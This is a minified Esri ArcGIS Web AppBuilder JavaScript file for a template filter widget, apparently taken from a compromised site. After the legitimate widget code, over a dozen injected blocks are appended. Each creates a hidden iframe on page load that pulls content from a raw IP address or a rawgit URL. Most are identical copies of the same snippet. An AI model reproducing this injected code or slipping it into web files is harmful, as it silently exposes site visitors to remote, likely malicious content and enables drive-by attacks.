// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/dom-construct dijit/_TemplatedMixin dijit/_WidgetBase".split(" "),function(k,f,g,e,l,m){return k([m,l],{name:"SEFilterEditor",baseClass:"jimu-widget-sefilterEditor",declaredClass:"jimu.dijit.SEFilterEditor",templateString:"\x3cdiv style\x3d'width:100%'\x3e\x3cdiv data-dojo-attach-point\x3d'filterEditorDiv'\x3e\x3c/div\x3e\x3c/div\x3e",_templatePicker:null,_layers:null,map:null,nls:null,_origGetItemsFromLayerFunc:null,postCreate:function(){this._createFilterTool()},
_createFilterTool:function(){this._createLayerFilter();this._createTemplateFilter();this._loadTemplates()},_createLayerFilter:function(){this.selectDropDown=e.create("select",{"class":"flDropDown templatePicker"});e.place(this.selectDropDown,this.filterEditorDiv);this.selectDropDown.onchange=f.hitch(this,function(){this._onLayerFilterChanged()})},removeOptions:function(a){var b;for(b=a.options.length-1;0<=b;b--)a.remove(b)},_loadTemplates:function(){var a=this.selectDropDown.value===this.nls.filterEditor.all||
""===this.selectDropDown.value?null:this.selectDropDown.value,b=this.filterTextBox.value,h=!1;this.removeOptions(this.selectDropDown);var d=e.create("option",{value:this.nls.filterEditor.all,innerHTML:this.nls.filterEditor.all});e.place(d,this.selectDropDown);for(var c,d=0;d<this._layers.length;d++)c=this._layers[d],!0===c.visible&&!0===c.visibleAtMapScale&&(null!==a&&c.id===a&&(h=!0),c=e.create("option",{value:c.id,innerHTML:c.name}),e.place(c,this.selectDropDown));!0===h&&(this.selectDropDown.value=
a,this._onLayerFilterChanged());null!==b&&""!==b&&(this.filterTextBox.value=b,this._onTemplateFilterChanged())},setTemplatePicker:function(a,b){this._layers=b;this._templatePicker=a;this._overrideTemplatePicker();this._loadTemplates()},_createTemplateFilter:function(){this.filterTextBox=e.create("input",{"class":"searchtextbox templatePicker",type:"text",placeholder:this.nls.filterEditor.searchTemplates},this.filterEditorDiv);this.filterTextBox.onkeyup=f.hitch(this,function(){this._onTemplateFilterChanged()});
this._overrideTemplatePicker()},_overrideTemplatePicker:function(){this._origGetItemsFromLayerFunc=this._templatePicker._getItemsFromLayer;this._templatePicker._getItemsFromLayer=f.hitch(this,function(){var a;a=this._origGetItemsFromLayerFunc.apply(this._templatePicker,arguments);var b=this.filterTextBox.value;b&&(a=g.filter(a,function(a){var d=!1,c=new RegExp(b,"ig");a.hasOwnProperty("label")&&a.label.match(c)&&0<a.label.match(c).length&&(d=!0);a.hasOwnProperty("template")&&a.template.hasOwnProperty("name")&&
a.template.name.match(c)&&0<a.template.name.match(c).length&&(d=!0);return d}));0===a.length&&(this._templatePicker.grid.noDataMessage=this.nls.filterEditor.noAvailableTempaltes);return a})},_onLayerFilterChanged:function(){this._templatePicker.clearSelection();var a=this.selectDropDown.options[this.selectDropDown.selectedIndex].text;""!==a&&(a===this.nls.filterEditor.all?(a=g.filter(this._layers,function(a){return!0===a.visible&&!0===a.visibleAtMapScale}),this._templatePicker.attr("featureLayers",
a),""===this.filterTextBox.value?this._templatePicker.attr("grouping",!0):this._templatePicker.attr("grouping",!1)):(a=this.map.getLayer(this.selectDropDown.value),this._templatePicker.attr("featureLayers",[a]),this._templatePicker.attr("grouping",!1)),this._templatePicker.update())},_onTemplateFilterChanged:function(){var a=this.filterTextBox.value;this.selectDropDown.options[this.selectDropDown.selectedIndex].text===this.nls.filterEditor.all&&""===a?this._templatePicker.attr("grouping",!0):this._templatePicker.attr("grouping",
!1);this._templatePicker.update()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});